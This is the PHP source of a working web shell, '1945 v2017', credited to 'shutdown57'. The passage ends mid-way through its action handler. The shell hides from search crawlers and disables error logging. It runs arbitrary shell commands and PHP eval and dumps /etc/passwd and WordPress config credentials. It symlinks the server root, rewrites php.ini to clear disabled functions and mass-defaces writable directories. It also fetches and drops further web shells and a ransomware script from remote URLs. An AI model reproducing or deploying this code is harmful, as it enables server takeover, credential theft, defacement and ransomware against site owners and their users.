<?php
/**
@ 1945 v2017
@ Author 	: shutdown57 a.k.a alinko
@ Codename  : MerdekaAtaoeMati
@ Version   : 2017.0
@ Contact   : indonesianpeople.shutdown57@gmail.com
@ Respect   : Ir. Soekarno - Muh. Hatta - Pahlawan Nasional Indonesia
@ Greets    : linuXcode.org - IndoXploit.or.id - Madleets.com
@
*/
@error_reporting(0);
session_start();
@set_time_limit(0);
@ini_set('file_uploads',on);
@ini_set('upload_max_filesize',1000);
@ini_set('error_log',NULL); 
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

// Block Dorking Shell Redirect to 404 Page
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
// End

$passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
$session_name = "_session_1945_v2017";
$session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)];
$image_bg_45 	= "https://alintamvanz.github.io/images/indonesian.jpg"; // background image login.

function passwd_45_login($wallpaper) {
	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
	echo "<style>body{background:url('".$wallpaper."')no-repeat center center;";
	echo "background-size:cover;background-attachment:fixed;-o-background-size:cover;-moz-background-size:cover;-webkit-background-size:cover;";
	echo "-o-background-attachment:fixed;-moz-background-attachment:fixed;-webkit-background-attachment:fixed}";
	echo "input{color:green;border:1px solid green;margin-top:250px;margin-bottom:250px;background:transparent;box-shadow:0px 3px 6px #fff}";
	echo "</style>";
    echo "<form method='POST'><center><input type='password' name='pass' placeholder='Password'><input type='submit' value='>>'></center></form>";
   exit;
}


if(!isset($session_45)){
    if(empty($passwd_45)||(isset($_POST['pass'])&&(md5($_POST['pass'])==$passwd_45))){
        $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)] = true;

}else{
        passwd_45_login($image_bg_45);
}
}
$arrayku1945 = array(
					"adminer"	=>	"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
					"awesomeware"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/awesome1945.php",
					"1945v1"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php",
					"ayana"	=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php",
					"linuxcode" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php",
					"indoxploit"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php",
					"symlinksa"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symlinksa.php",
					"symlinkmb"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symobile.php",
					"filename" => array(
						"adminer"=>"adminer1945.php",
						"awesomeware"=>"awesome1945.php",
						"1945v1"=>"1945v1.php",
						"ayana"=>"ayana1945.php",
						"linuxcode"=>"linuxcode1945.php",
						"indoxploit"=>"indoxploit1945.php",
						"symlinksa"=>"sym1945.php",
						"symlinkmb"=>"symobile1945.php",
						)
					);
class Html45{
	public function backtolo(){
		$filename = $_SERVER['PHP_SELF'];
		echo "<br><br><center><h1>[<a href='".$filename."?_shutdown57_a.k.a_alinko_kun:*'>Home</a>] [<a href='javascript:history.go(-1);'>Back To History</a>] </h1></center>";
	}
	public function modal($head,$konten,$id){
		echo '<div class="modal"><input id="'.$id.'" type="checkbox" /><label for="'.$id.'" class="overlay"></label><article>
		    <header><h3>'.$head.'</h3><label for="'.$id.'" class="close">&times;</label></header>
		    <section class="content">
		   '.$konten.'
		    </section>
		    <footer>
		      <label for="'.$id.'" class="button dangerous">
		        Close
		      </label>
		    </footer>
		  </article>
		</div>';
	}
	public function form($method,$content){
		echo "<form method='".$method."'>";
		echo $content;
		echo "</form>";
	}
	public function input($type,$name,$add,$label){
		$input = "<center><label for='".$name."'>".$label."</label>  : ";
		$input .= "<input type='".$type."' name='".$name."' ".$add."></center>";
		return $input;
	}
	public function submit($name,$value,$add){
		$submit = "<center><input type='submit' value='".$value."' ".$add."' name='".$name."'></center>";
		return $submit;
	}
	public function h1($text){
		echo "<center><h1>./ ".$text."</h1></center>";
	}
	public function txtarea($name,$content,$add){
		$txt = "<center>";
		$txt.= "<textarea name='".$name."' ".$add."'>";
		$txt.= $content;
		$txt.= "</textarea></center>";
		return $txt;
	}
	public function select($option,$name,$add){
		echo "<select name='".$name."' ".$add.">";
		echo $option;
		echo "</select>";
	}
	public function option($val,$show){
		$opt= "<option value='".$val."'>";
		$opt.= $show;
		$opt.= "</option>";
		return $opt;
	}
	public function footer($content){
		echo "<center>";
		echo "<div style='width:100%;height:20px;background:pink;color:#fff;margin-top:200px;font-size:12px;'>";
		echo $content;
		echo "</div></center>";
	}
}

class FileMan45{
	public $table;

	public function perms45($file)
	{
		if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
	}

	public function lmodif45($file){
	$mod=date('d M Y [H:m]',filemtime($file));
	return $mod;
	}

	public function owngro45($file){
	$name=@posix_getpwuid(@fileowner($file));
	$group=@posix_getgrgid(@filegroup($file));
	$owngro=$name['name'].":".$group['name'];
	return $owngro;
	}

	public function mime45($path)
	{
	if(@mime_content_type($path)){
		$mime=mime_content_type($path);
	}else{
		$mime="unknow/denied";
	}
	return $mime;
	}
	public function fSize45($upil){
	$size = filesize($upil)/1024;
		$size = round($size,3);
		if($size >= 1024){
		$size = round($size/1024,2).' MB';
		}else{
		$size = $size.' KB';
		}
		return $size;
		}
	public function td($isi){
		echo "<td>";
		echo $isi;
		echo "</td>";
	}
	public function th($isi){
		echo "<th>";
		echo $isi;
		echo "</th>";
	}
	public function ScanDir($dir)
	{
		echo "<table class='primary' align='center' style='width:100%;'>";
		$this->th("FILES");
		$this->th("SIZE");
		$this->th("TYPE");
		$this->th("GROUP:OWNER");
		$this->th("PERMISSION");
		$this->th("LAST MODIF");
		$this->th("ACTION");

		$s = @scandir($dir);
			echo "<tr>";
			echo "<td colspan='6'>[[ <a href='?_d=".dirname($dir)."'>..</a> ]]</td>";
			echo "<td>
				<a href='#' onclick=\"window.location.href='?_o=$dir&_x=nfile'\">NewFile</a>
				<a href='#' onclick=\"window.location.href='?_o=$dir&_x=ndir'\">NewDir</a>";
			echo "</tr>";
		foreach($s as $d)
		{

			if(!is_dir("$dir/$d")||$d=="."||$d=="..")continue;
			echo "<tr>";
			$this->td("[ <a href='?_d=$dir/$d'>$d</a> ]");
			$this->td($this->fSize45("$dir/$d"));
			$this->td($this->mime45("$dir/$d"));
			$this->td($this->owngro45("$dir/$d"));
			$this->td($this->perms45("$dir/$d"));
			$this->td($this->lmodif45("$dir/$d"));
			$this->td("
				<a href='#' onclick=\"window.location.href='?_o=$dir/$d&_x=ren'\" title='Rename : $d'>Ren</a>
				<a href='#' onclick=\"window.location.href='?_o=$dir/$d&_x=del'\" title='Delete : $d'>Del</a>");
			echo "</tr>";
		}

		foreach($s as $f)
		{
			if(!is_file("$dir/$f")||$f=="."||$f=="..")continue;
			echo "<tr>";
			$this->td("<a href='?_o=$dir/$f&_x=view'>$f</a>");
			$this->td($this->fSize45("$dir/$f"));
			$this->td($this->mime45("$dir/$f"));
			$this->td($this->owngro45("$dir/$f"));
			$this->td($this->perms45("$dir/$f"));
			$this->td($this->lmodif45("$dir/$f"));
			$this->td("<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=ren'\"  title='Rename : $f'>Ren</a>
				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=del'\" title='Delete : $f'>Del</a>
				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=edit'\" title='Edit : $f'>Edit</a>
				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=dl'\" title='Download : $f'>Dl</a>");
			echo "</tr>";
		}
		echo "</table>";
	}
}

class Action45{
	public function phpinfo45(){
	phpinfo();
	}
	public function reverse45($url)
	{
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		curl_close($ch);
	}
	public function wpc45($dir){
	if(!file_exists($dir."/wp-config.php")){
		echo "<h1> Directory Wordpress Not Exist</h1>";
	}else{
		$fp =fopen('wordpress-config.txt','w');
		fwrite($fp,htmlspecialchars(file_get_contents($dir."/wp-config.php")));
		fclose($fp);
	}
	}
	public function edit45($dir)
	{

		echo "<center>";
		echo "<form method='POST'>";
		echo "<textarea style='width:800px;height:400px;'  name='edit'>";
		echo htmlspecialchars(file_get_contents($dir));
		echo "</textarea>";
		echo "<input type='submit' value='save' name='save'  style='width:700px'>";
		echo "</form></center>";
		if(isset($_POST['save']))
		{
			$fp = fopen($dir,"w");
			if(fwrite($fp,$_POST['edit']))
			{
				echo "<script>window.location.href='?_d=".dirname($dir)."'</script>";
			}else{
				echo "<script>alert('Can Not Edit~') window.location.href='?_d=".dirname($dir)."'</script>";
			}
			fclose($fp);
		}
	}
	public function del45($dir)
	{
		if(is_file($dir)){
			$del=unlink($dir);
		}elseif (is_dir($dir)) {
			if(!rmdir($dir))
			{
				if(!rmdir(unlink($dir))){
					if(!rmdir(rmdir(unlink($dir)))){
						if(!rmdir(unlink(rmdir($dir)))){
							$del=rmdir(rmdir(rmdir(unlink($dir))));
						}
					}
				}
			}
		}
		return $del;
	}
	public function rename45($dir)
	{
		echo "<center>";
		echo "<form method='post'>";
		echo "<input type='hidden' name='oldname' value='$dir'>";
		echo "<input type='text' name='newname' value='new_name' >";
		echo "<input type='submit' name='submit' value='Save' >";
		echo "</form>";
		echo "</center>";
		if(isset($_POST['submit']))
		{
			if(rename($_POST['oldname'],$_POST['newname'])){
				echo "<script>window.location.href='?_d=".dirname($dir)."';</script>";
			}else{
				echo "<script>alert('Can Not Rename'); window.location.href='?_d=".dirname($dir)."' </script>";
			}
		}
	}
	public function dl45($dl)
	{
	@ob_clean();
	@header('Content-Description: File Transfer');
	@header('Content-Type: application/octet-stream');
	@header('Content-Disposition: attachment; filename="'.basename($dl).'"');
	@header('Expires: 0');
	@header('Cache-Control: must-revalidate');
	@header('Pragma: public');
	@header('Content-Length: ' . filesize($dl));
	@readfile($dl);
	exit;
	}
	public function view45($file)
	{
		echo "<pre>";
		echo htmlspecialchars(file_get_contents($file));
		echo "</pre>";
	}
	public function upl45($tmp,$dst)
	{

		if(function_exists('move_uploaded_file'))
		{
			$upl = @move_uploaded_file($tmp,$dst);
		}elseif(function_exists('copy'))
		{
			$upl = @copy($tmp,$dst);
		}else{
			$upl ="<script> alert('function upload disable')</script>";
		}
		return $upl;
	}
	public function Shell45($cmd){
		if(function_exists('system')){
			$sys = @system($cmd);
		}elseif(function_exists('exec')){
			$sys = @exec($cmd);
		}elseif (function_exists('shell_exec')) {
			$sys = @shell_exec($cmd);
		}elseif (function_exists('passthru')) {
			$sys = @passthru($cmd);
		}else{
			$sys = "<h1> Function not Found~<br> This Feature Disabled in Server~</h1>";
		}
		return $sys;
	}
	public function cfile45($nama,$konten){
		$fp = fopen($nama,'w');
		$co = fwrite($fp,$konten);
		fclose($fp);
		return $co;
	}
  public function cdir45($namadir){
    if(file_exists('mkdir'))
    {
      $mkdir = "<script> alert('Directory  ".$namadir." Exist~ ');</script>";
    }else{
      $mkdir = @mkdir($namafile);
    }
    return $mkdir;
  }
	public  function kuchiyose45($url,$nama)
	{
		if(file_exists($nama)){
			$res = "<center><h3> File ".$nama." Exists! -> <a href='".$nama."' target='_blank'>".$nama." here?</a></h3>";
			echo $res;
		}else{
		$fp = fopen($nama, "w");
		$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_FILE, $fp);
	$res= curl_exec($ch);
					curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	if($res){
		echo "<script>alert('Boom boom boom!'); window.open('".$nama."'); </script>";
	}else{
		echo "<script>alert('Failed Coeg~'); window.location.href='?____shutdown57';</script>";
	}
	}
	return $res;
}
	public function massdeface45($dir,$file,$script)
	{
		$s=scandir($dir);
		foreach($s as $d){
			if(is_dir($d)){
				if(is_writable($dir."/".$d)){
					if(file_put_contents($dir."/".$d."/".$file,$script)){
						echo "[DEFACED] $dir/$d/$file <br>";
					}else{
						echo "[FAILED] $dir/$d/$file <br>";
					}
				} // wri
				$o=scandir($d);
				foreach($o as $o2){
					if(is_dir($o2)){
						if(is_writable($dir."/".$d."/".$o2)){
							if(file_put_contents($dir."/".$d."/".$o2."/".$file,$script)){
								echo "[DEFACED] $dir/$d/$o2/$file * <br>";
							}else{
								echo "[FAILED] $dir/$d/$o2/$file * <br>";
							}
						}
					}
				}

			}
		}
	}
	public function getcode45($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
}


class Head45{
	public function html45($judul){
		echo "<!DOCTYPE html><html><head><title>$judul</title><link rel='stylesheet' type='text/css' href='https://alintamvanz.github.io/css/picnic.min.css'><link rel='icon' type='text/css' href='https://alintamvanz.github.io/images/favicon_1945.gif'></head><body>";
		echo "<style>";
		echo "tr,td{height:30px;font-size:13px;}tr:hover{background:#ff4136;}tr a{color:#000;font-weight:bold;}tr a:hover{color:#fff;border-bottom:1px solid #fff}.pseudo:hover{background:#ff4136;color:#fff}th{background:#ff4136}</style>";
	}
	public function hdd45($s) {
		if($s >= 1073741824)
		return sprintf('%1.2f',$s / 1073741824 ).' GB';
		elseif($s >= 1048576)
		return sprintf('%1.2f',$s / 1048576 ) .' MB';
		elseif($s >= 1024)
		return sprintf('%1.2f',$s / 1024 ) .' KB';
		else
		return $s .' B';
		}
	public function SysInfo45($dir){
		if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
	} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
		}
		$hdd_free = $this->hdd45(disk_free_space("/"));
		$hdd_total = $this->hdd45(disk_total_space("/"));

		$sm= ini_get('safe_mode') ? "<font color=green> ON<?font>" : "<font color=red> OFF</font>";
		echo "<div class='flex 2' style='font-size:12px;width:100%;margin-top:55px'>";
		echo "<pre>";
		echo "Uname- : ".php_uname();
		echo "\nUser   : $user ($uid) | $group ($gid)";
		echo "\nPHP    : ".phpversion()." |<b>safemode:</b>$sm (<a href='?_o=$dir&_x=phpinfo'>phpinfo</a>)";
		echo "\nDisk   : ".$hdd_total." <b> Free :</b> ".$hdd_free;
		echo "</pre>";
		echo "<h1 style='font-size:4em;float:right;font-weight:bold;'>";
		echo "		<a href='?_o=$dir&_x=about&_1945_auth=shutdown57'>1945 2017</a>";
		echo "</h1>";
		echo "</div>";
	}
	public function Tools45($dir){
	echo '<nav class="demo"><a href="?_" class="brand"><span>1945 v2017</span></a><input id="bmenub" type="checkbox" class="show"><label for="bmenub" class="burger pseudo button">menu</label>
  <div class="menu">
    <a href="'.$_SERVER['PHP_SELF'].'" class="pseudo button">Home</a>
    <a href="?_o='.$dir.'&_x=sh" class="pseudo button ">Shell</a>
    <label for="modal_1" class="pseudo button">Upload</label>
    <a href="?_o='.$dir.'&_x=php" class="pseudo button ">PHP</a>
    <label for="secinfo" class="pseudo button">Sec. Info</label>
	<label for="weapon" class="pseudo button">WeaponX1945</label>
	<a href="?_o='.$dir.'&_x=I_love_U" class="pseudo button ">LogOut</a>
  </div>
</nav>';
echo '
<div class="modal">
  <input id="modal_1" type="checkbox" />
  <label for="modal_1" class="overlay"></label>
  <article>
    <header>
      <h3>Upload to : '.$dir.'</h3>
      <label for="modal_1" class="close">&times;</label>
    </header>
    <section class="content">';
		if(is_writable($dir)){
			$dis = "";
		}else{
			$dis = "disabled";
		}
		echo'
     <form method="POST" enctype="multipart/form-data" action="?_o='.$dir.'&_x=upl">
     <input type="file" name="file" '.$dis.'><input type="submit" name="sbmt" class="button" value="Upload?" '.$dis.'></form>
    </section>
    <footer>
      <label for="modal_1" class="button dangerous">
        Cancel
      </label>
    </footer>
  </article>
</div>
';

	}
	public function SecInfo45(){
		function red($t){
			return "<font color=red>".$t."</font>";
		}
		function green($t){
			return "<font color=green>".$t."</font>";
		}
		if(is_readable("/etc/passwd")){
			$etcpw = "/etc/passwd : <font color=green> READABLE </font> [<a href='javascript:;' onclick=\"document.getElementById('ep').style.display='block';\">Show</a>]";
			$etcpw .= "<div id='ep' style='display:none;'><pre style='width:500px;height:250px;'>";
			$etcpw .= file_get_contents("/etc/passwd");
			$etcpw .="</pre></div>";
		}else{
			$etcpw = "/etc/passwd : <font color=red> NOT READABLE</font>";
		}
		if(ini_get('disable_functions')){
			$str = ini_get('disable_functions');
			$df = "disable functions : ".wordwrap($str,40,"<br>",TRUE);
		}else{
			$df = "disable functions : <font color=green> NONE </font> (Not Secure)";
		}
		if(is_writable(php_ini_loaded_file()))
		{
			$ini = green("WRITEABLE")." | <a href='?_o=".__DIR__."&_x=phpini'>Edit php.ini</a>";
		}else {
			$ini = red("NOT WRITABLE");
		}
		$curl = (curl_init()) ? green("YOSHA") : red("NONE");
		$mysql = (function_exists('mysql_connect')) ? green("YOSHA") : red("NONE");
		$mysqli = (function_exists('mysqli_connect')) ? green("YOSHA") : red("NONE");
		if(function_exists('apache_get_modules')){
			$apache_load_module ="<b> Apache Loaded Module : ". wordwrap(implode(",",apache_get_modules()),40,"<br>",TRUE)."</b>";
		}else{
			$apache_load_module = "";
		}
		$html = new Html45();

		$head = "Security Info : ".$_SERVER['HTTP_HOST']." < ".gethostbyname($_SERVER['HTTP_HOST'])." > ";
		$konten = "<b> Server Software :". $_SERVER['SERVER_SOFTWARE'] . "</b><hr>";
		$konten.= $apache_load_module."<hr>";
		$konten.= "<b> IP Client : </b> ".$_SERVER['REMOTE_ADDR']."<hr>";
		$konten.= "<b> MySQL :".$mysql." | CURL : ".$curl." | MySQLI : ".$mysqli." | </b><hr>";
		$konten.= "<b> passwd file </b><br>".$etcpw;
		$konten.= "<hr><b>Disable Functions </b><br>";
		$konten.= $df;
		$konten.= "<hr><b> php.ini</b><br>";
		$konten.= $ini;
		$id = "secinfo";
		$html->modal($head,$konten,$id);
	}
}

// menentukan directory
if(isset($_GET['_d']))
{
	$d = $_GET['_d'];
}elseif($_GET['_o']){
	if(is_file($_GET['_o'])){
		$d = dirname($_GET['_o']);
	}else{
	$d = $_GET['_o'];
	}
}else{
	$d = getcwd();
}


$html = new Html45();

// List Tools
function abtn($href,$val){
	$o= "   <a href='#shutdown57_a.k.a_alinko_kun' onclick=\"window.location.href='".$href."'\" class='button'>".$val."</a>   ";
	return $o;
}
$weapon = abtn("?_o=$d&_x=lsym","linuXSymLink");
$weapon.= abtn("?_o=$d&_x=jump","Jumping");
$weapon.= abtn("?_o=$d&_x=wpc","WP Config");
$weapon.= abtn("?_o=$d&_x=md","Mass Deface");
$weapon.= abtn("?_o=$d&_x=rw","RansomeWare");
$weapon.= abtn("?_o=$d&_x=fr","Fake Root");
$weapon.= abtn("?_o=$d&_x=zh","Zone-H");
$weapon.= abtn("?_o=$d&_x=af","Admin Finder Wordlist");
$weapon.= abtn("?_o=$d&_x=di","Defacer ID");
$weapon.= abtn("?_o=$d&_x=am","Adminer");
$weapon.= abtn("?_o=$d&_x=net","Network");
$weapon.= "<hr><h3> KuchiyoseX1945 </h3><hr>";
$weapon.= abtn("?_o=$d&_x=sym","Symlink Sa");
$weapon.= abtn("?_o=$d&_x=symb","Symlink mobile");
$weapon.= abtn("?_o=$d&_x=1945v1","1945v1 Shell");
$weapon.= abtn("?_o=$d&_x=lc","linuXcode v2017");
$weapon.= abtn("?_o=$d&_x=as","AyanaShahab priv8 shell");
$weapon.= abtn("?_o=$d&_x=idx","IndoXploit Shell");
$html->modal("WeaponX1945",$weapon,"weapon");
// End List

$Head = new Head45();
$Head->html45("1945-X-".$_SERVER['HTTP_HOST']);

$Head->SysInfo45($d);
$Head->Tools45($d);
// FileManager

$FileMan = new FileMan45();
$Head->SecInfo45();

$d=str_replace('\\','/',$d);
$path = explode('/',$d);
echo "<b>Directory : </b>";
foreach($path as $id=>$curdir){
if($curdir == '' && $id == 0){
$a = true;
echo '<a href="?_d=/">/</a>';
continue;
}
if($curdir == '') continue;
echo '<a href="?_d=';
for($i=0;$i<=$id;$i++){
echo "$path[$i]";
if($i != $id) echo "/";
}
echo '">'.$curdir.'</a>/';
}
echo "<hr>";

if(!isset($_GET['_o'])){

$FileMan->ScanDir($d);

}else{
// Logika AKsi ifelse
if(isset($_GET['_x'])){
$act = new Action45();

$x = $_GET['_x'];
if($x == "edit"){
$html->h1("Edit File : <small>".$_GET['_o']."</small>");
$act->edit45($_GET['_o']);

}elseif($x == "del"){
if($act->del45($_GET['_o'])){
	echo "<script>window.location.href='?_d=".dirname($_GET['_o'])."';</script>";
}else{
	echo "<script>window.location.href='?_d=".dirname($_GET['_o'])."';</script>";
}

}elseif($x == "ren"){
	$html->h1("Rename : <small>".$_GET['_o']."</small>");
	$act->rename45($_GET['_o']);
}elseif ($x == "dl") {
	@$act->dl45($_GET['_o']);
}elseif ($x == "view") {
	$html->h1("VIew Content : <small>".$_GET['_o']."</small>");
	$act->view45($_GET['_o']);
}elseif ($x == "upl") {
	if($act->upl45($_FILES['file']['tmp_name'],$_GET['_o']."/".$_FILES['file']['name'])){
		echo "<script>alert('Upload OK!'); window.location.href='?_d=".$_GET['_o']."'</script>";
	}else{
		echo "<script>alert('Upload FAIL!'); window.location.href='".$_GET['_o']."'</script>";
	}
}elseif ($x == "sh") {
	$html->h1("Shell Command : ".$_SERVER['HTTP_HOST']);
	$html->form("POST",$html->input("text","sh","style='width:80%;'",$_SERVER['HTTP_HOST']));
	if(isset($_POST['sh'])){
		echo "<pre>";
		$act->Shell45($_POST['sh']);
		echo "</pre>";
	}
}elseif ($x == "php") {

	$html->h1("PHP Eval ");
	$content = $html->txtarea("eval","phpinfo();","style='width:700px;height:300px;'");
	$content .=$html->submit("evals","Execute php","");
	$html->form("POST",$content);
	if(isset($_POST['evals']))
	{
		eval($_POST['eval']);
	}


}elseif ($x == "phpinfo") {
	$act->phpinfo45();
}elseif ($x == "nfile") {
	$html->h1("New File : <small>".$_GET['_o']."</small>");
	$html->form("POST",$html->txtarea("newfile","// new-file 1945","style='width:700px;height:300px;'").$html->input("text","nama","value='namafile.php' style='width:500px;'","newfile name").$html->submit("simpan","Save New File",""));
	if(isset($_POST['simpan']))
	{
		if($act->cfile45($_GET['_o']."/".$_POST['nama'],$_POST['newfile'])){
			echo "<script>alert('Make File Done !'); window.location.href='?_d=".$_GET['_o']."'</script>";
		}else{
			echo "<script> alert('Permission denied.. can not create file ')</script>";
		}
	}
}elseif ($x == "ndir") {
  $html->h1("New Directory : <small>".$_GET['_o']."</small>");
  $html->form("POST",$html->input("text","dir","value='new-dir-45'","New Directory").$html->submit("simpan","Save New Directory",""));
  if(isset($_POST['simpan']))
  {
    if($act->cdir45($_GET['_o']."/".$_POST['dir']))
    {
      echo "<script>alert('Created Directory~'); window.location.href='?_d=".dirname($_GET['_o'])."'</script>";
    }else{
      echo "<script>alert('Permission Denied Can not Create Directory');</script>";
    }
  }
}elseif ($x == "phpini") {
	$html->h1("Create php.ini configuration : <small>".$_GET['_o']."/php.ini</small>");
	$select = $html->option("disable_functions=NONE","disable functions").$html->option("safe_mode=NONE","safe mode");
	$content = $html->txtarea("phpini","disable_functions=NONE","style='width:700px;height:400px;'").
						$html->select($select,"sphpini","").
						$html->submit("submits","Create Config","");
	$html->form("POST",$content);
	if(isset($_POST['submits'])){
		if($act->cfile45("php.ini",$_POST['phpini']."\n".$_POST['sphpini']))
		{
			echo "<script>alert('php.ini Created~'); window.location.href='?'</script>";
		}else{
			echo "<script>alert('Permission Denied~')</script>";
		}
	}
}elseif($x == "lsym"){
		$html->h1("linuX Symlink :p");
		$letak = "Sym45";
		$open = $letak;
		$act->Shell45("ln -s / Sym45");
		echo "linuX Symlink Execute ln -s / Sym45 -> DONE ? <br> <a href='$open' target='_blank'>Click Here</a>";
}elseif($x == "wpc"){
		$html->h1("wordpress-config");
		$val = __DIR__;
		$input = $html->input("text","ldir","style='width:300px;' value='".$val."'","Wordpress dir ");
		$submit = $html->submit("submitz","Get Config~","");
		$html->form("POST",$input.$submit);
		if(isset($_POST['submitz'])){
			if($act->wpc45($_POST['ldir'],"<h1>FAILED AJG</h1>")){
				echo "<script> alert('Yosha !');  window.location.href='?_o=$d/wordpress-config.txt&_x=view'</script>";
			}
		}
}elseif($x == "fr"){
	$html->h1("Fake Root?");
	ob_start();
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = $act->getcode45("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "[ <font color=green>DONE</font> ] <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a><br>";
			}
		}
	} else {
		$konten=$html->input("text","file","style='width:300px;'","Filename").$html->input("text","user","style='width:300px;' value='$user'","User");
		$konten.=$html->txtarea("url",$act->reverse45($_SERVER['HTTP_HOST']),"style='width:500px;height:400px;'");
		$konten.=$html->submit("reverse","Scan Fake Root?","");
		$html->form("POST",$konten);
	}
}elseif($x == "about"){
echo "<div class='about_1945'>";
echo "<center>";
echo "<img src='https://alintamvanz.github.io/images/garuda.png' style='width:300px;hieght:300px'>";
$html->h1("About 1945 v2017 ?");
echo "<h2>1945v2017 by : shutdown57 a.k.a alinko kun</h2>";
echo "<h3>Github : @alintamvanz | Facebook : Alinko Kun</h3>";
echo "<h4>Email  : indonesianpeople.shutdown57@gmail.com | Site : www.linuXcode.org</h4>";
echo "<h5>Respect: Ir. Soekarno - Muh. Hatta - Pahlawan Nasional Indonesia</h5>";
echo "<h6>Greets : linuXcode.org - IndoXploit.or.id - Madleets.com</h6>";
echo "<b>READ LICENSE</b><br><textarea style='width:500px;height:300px;'>".file_get_contents('https://raw.githubusercontent.com/alintamvanz/webshell/master/LICENSE')."</textarea>";
echo "</div>";
}elseif($x == "md"){
$html->h1("Mass Deface");
if(empty($_POST['sbmt'])){
$konten = $html->input("text","letak","style='width:300px;' value='".$d."'","Directory");
$konten.= $html->input("text","fn","style='width:300px;' value='s57.html'","Filename");
$konten.= $html->txtarea("script","Hacked by shutdown57","style='width:500px;height:400px;'");
$konten.= $html->submit("sbmt","Deface","");
$html->form("POST",$konten);
}else{
	if(isset($_POST['letak'])&&isset($_POST['fn'])&&isset($_POST['script'])){
		$act->massdeface45($_POST['letak'],$_POST['fn'],$_POST['script']);
	}
}

}elseif ($x == "I_love_U") {
	session_destroy();
	echo "<script> alert('Bye Bye Bye !'); window.location.href='".$_SERVER['PHP_SELF']."'; </script>";
}elseif ($x == "rw") {
	$act->kuchiyose45($arrayku1945['awesomeware'],$arrayku1945['filename']['awesomeware']);
	$html->backtolo();
}elseif ($x == "1945v1") {
	$act->kuchiyose45($arrayku1945['1945v1'],$arrayku1945['filename']['1945v1']);
	$html->backtolo();
}elseif ($x == "lc") {
	$act->kuchiyose45($arrayku1945['linuxcode'],$arrayku1945['filename']['linuxcode']);
	$html->backtolo();
}elseif ($x == "am") {
	$act->kuchiyose45($arrayku1945['adminer'],$arrayku1945['filename']['adminer']);
	$html->backtolo();
}elseif ($x == "as") {
	$act->kuchiyose45($arrayku1945['ayana'],$arrayku1945['filename']['ayana']);
	$html->backtolo();
}elseif ($x == "idx") {
	$act->kuchiyose45($arrayku1945['indoxploit'],$arrayku1945['filename']['indoxploit']);
	$html->backtolo();
}elseif ($x == "sym") {
	$act->kuchiyose45($arrayku1945['symlinksa'],$arrayku1945['filename']['symlinksa']);
